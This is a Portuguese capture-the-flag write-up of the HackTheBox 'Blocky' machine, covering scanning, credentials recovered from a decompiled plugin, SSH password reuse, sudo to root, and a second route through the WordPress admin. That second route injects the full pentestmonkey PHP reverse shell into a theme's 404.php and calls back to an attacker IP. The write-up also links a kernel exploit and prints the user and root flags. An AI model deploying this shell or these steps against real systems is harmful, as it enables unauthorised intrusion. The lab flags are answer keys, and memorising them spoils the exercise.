# Blocky WriteUp

# Scan

```
# Nmap 7.92 scan initiated Mon Jan  3 15:04:55 2022 as: nmap -A -Pn -p 21,22,80 -T5 -oN scan.txt 10.129.1.53
Nmap scan report for 10.129.1.53
Host is up (0.17s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp?
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)
|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)
|_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-generator: WordPress 4.8
|_http-title: BlockyCraft &#8211; Under Construction!
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.13 (92%), Linux 3.16 (92%), Linux 3.2 - 4.9 (92%), Linux 3.16 - 4.6 (90%), Linux 3.18 (90%), Linux 4.2 (90%), Linux 4.4 (90%), Linux 4.8 (90%), Crestron XPanel control system (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   162.87 ms 10.10.14.1
2   163.04 ms 10.129.1.53

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jan  3 15:08:55 2022 -- 1 IP address (1 host up) scanned in 241.19 seconds
```

## Enumeration

```bash
ffuf -u http://10.129.1.53/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.1.53/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

javascript              [Status: 301, Size: 315, Words: 20, Lines: 10]
wp-content              [Status: 301, Size: 315, Words: 20, Lines: 10]
plugins                 [Status: 301, Size: 312, Words: 20, Lines: 10]
wp-admin                [Status: 301, Size: 313, Words: 20, Lines: 10]
wiki                    [Status: 301, Size: 309, Words: 20, Lines: 10]
phpmyadmin              [Status: 301, Size: 315, Words: 20, Lines: 10]
wp-includes             [Status: 301, Size: 316, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 299, Words: 22, Lines: 12]
                        [Status: 200, Size: 52256, Words: 3306, Lines: 314]
                        [Status: 200, Size: 52256, Words: 3306, Lines: 314]
                        [Status: 200, Size: 52256, Words: 3306, Lines: 314]
:: Progress: [62283/62283] :: Job [1/1] :: 255 req/sec :: Duration: [0:04:09] :: Errors: 3 ::
```

Essa máquina possui 2 maneiras de ser invadida, e ambas serão documentadas aqui. 

A primeira, quando tivermos enumerado os diretórios, podemos ver dois arquivos .jar no diretório `plugins`. Ao baixar o arquivo BlockyCore.jar, podemos olhar o que tem dentro dele usando a tool `jd-gui` . Ao ver dentro, podemos ver um arquivo chamado `BlockyCore.class` que possui o seguinte conteúdo:

```java
package com.myfirstplugin;

public class BlockyCore {
  public String sqlHost = "localhost";

  public String sqlUser = "root";

  public String sqlPass = "8YsqfCTnvxAUeduzjNSXe22";

  public void onServerStart() {}

  public void onServerStop() {}

  public void onPlayerJoin() {
    sendMessage("TODO get username", "Welcome to the BlockyCraft!!!!!!!");
  }

  public void sendMessage(String username, String message) {}
}
```

Com esse arquivo conseguimos credenciais de acesso do banco de dados.



## Exploitation - 1

Com essas credenciais, podemos partir para a primeira exploração que envolve password reuse. Durante o reconhecimento do alvo, podemos ver a seguinte mensagem na pagina principal do site:

> Posted on [July 2, 2017](http://10.129.1.53/index.php/2017/07/02/welcome-to-blockycraft/) by [Notch](http://10.129.1.53/index.php/author/notch/)
> 
> # Welcome to BlockyCraft!
> 
> Welcome everyone. The site and server are still under construction so don’t expect too much right now!
> 
> We are currently developing a wiki system for the server and a core 
> plugin to track player stats and stuff. Lots of great stuff planned for 
> the future 🙂

Com essa mensagem, podemos interpretar que o admin da página se chama "Notch".

Como vimos que a porta ssh está aberta, podemos tentar logar com o usuário "notch" e a senha do banco de dados que nós encontramos, e para a nossa surpresa, funciona.



## Privilege Escalation - 1

Após logar no ssh do user "notch", podemos olhar sua configuração no sudo com `sudo -l` :

```bash
notch@Blocky:~$ sudo -l
[sudo] password for notch: 
Matching Defaults entries for notch on Blocky:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User notch may run the following commands on Blocky:
    (ALL : ALL) ALL
```

Com isso, podemos ver que o usuário "notch" pode fazer qualquer coisa com sudo. Então podemos dar um `sudo -i` e virar root.



---

## Exploitation - 2

Após ter pego as credenciais, podemos logar com elas no `phpmyadmin` que foi encontrado durante a enumeração. Tendo logado, podemos usar nossos poderes administrativos para mudar a senha de acesso ao painel administrativo do wordpress do usuário "Notch". Segue o seguinte [link](https://help.one.com/hc/en-us/articles/115005585949-Change-your-WordPress-password-in-the-database) para fazer a alteração.

Após feito a alteração para a senha desejada, é possível logar em `wp-login`.

Tendo logado, podemos alterar o conteúdo de um dos temas para podermos executar nossa reverse shell. Para isso alteramos o template do arquivo "404.php" para o seguinte conteúdo:

```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.16';  // CHANGE THIS
$port = 80;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
        // Fork and have the parent process exit
        $pid = pcntl_fork();

        if ($pid == -1) {
                printit("ERROR: Can't fork");
                exit(1);
        }

        if ($pid) {
                exit(0);  // Parent exits
        }

        // Make the current process a session leader
        // Will only succeed if we forked
        if (posix_setsid() == -1) {
                printit("Error: Can't setsid()");
                exit(1);
        }

        $daemon = 1;
} else {
        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
        printit("$errstr ($errno)");
        exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
        printit("ERROR: Can't spawn shell");
        exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
        // Check for end of TCP connection
        if (feof($sock)) {
                printit("ERROR: Shell connection terminated");
                break;
        }

        // Check for end of STDOUT
        if (feof($pipes[1])) {
                printit("ERROR: Shell process terminated");
                break;
        }

        // Wait until a command is end down $sock, or some
        // command output is available on STDOUT or STDERR
        $read_a = array($sock, $pipes[1], $pipes[2]);
        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

        // If we can read from the TCP socket, send
        // data to process's STDIN
        if (in_array($sock, $read_a)) {
                if ($debug) printit("SOCK READ");
                $input = fread($sock, $chunk_size);
                if ($debug) printit("SOCK: $input");
                fwrite($pipes[0], $input);
        }

        // If we can read from the process's STDOUT
        // send data down tcp connection
        if (in_array($pipes[1], $read_a)) {
                if ($debug) printit("STDOUT READ");
                $input = fread($pipes[1], $chunk_size);
                if ($debug) printit("STDOUT: $input");
                fwrite($sock, $input);
        }

        // If we can read from the process's STDERR
        // send data down tcp connection
        if (in_array($pipes[2], $read_a)) {
                if ($debug) printit("STDERR READ");
                $input = fread($pipes[2], $chunk_size);
                if ($debug) printit("STDERR: $input");
                fwrite($sock, $input);
        }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
        if (!$daemon) {
                print "$string\n";
        }
}

?>
```

E para executarmos, é só irmos na URL http://10.129.1.53/wp-content/themes/twentyseventeen/404.php que receberemos a shell reversa.

Dessa maneira, iremos cair no servidor como user "www-data" e não teremos acesso a flag de usuário, então para pegá-la teremos que escalar privilégios direto.



## Privilege Escalation

Para fazermos o privilege esclation, podemos ver com o comando `uname -a` que a máquina possui um kernel antigo. Após dar uma pesquisada, encontramos o seguinte kernel exploit que pode ser usado para fazer o privilege escalation: https://www.exploit-db.com/raw/41458

Após compilar o exploit em nossa máquina e depois baixá-lo no alvo, podemos dar permissão de execução ao arquivo e executá-lo e então seremos root.



- User Flag:

```bash
cat user.txt
59fee0977fb60b8a0bc6e41e751f3cd5
```



- Root Flag:

```bash
cat root.txt
0a9694a5b4d272c694679f7860f1cd5f
```
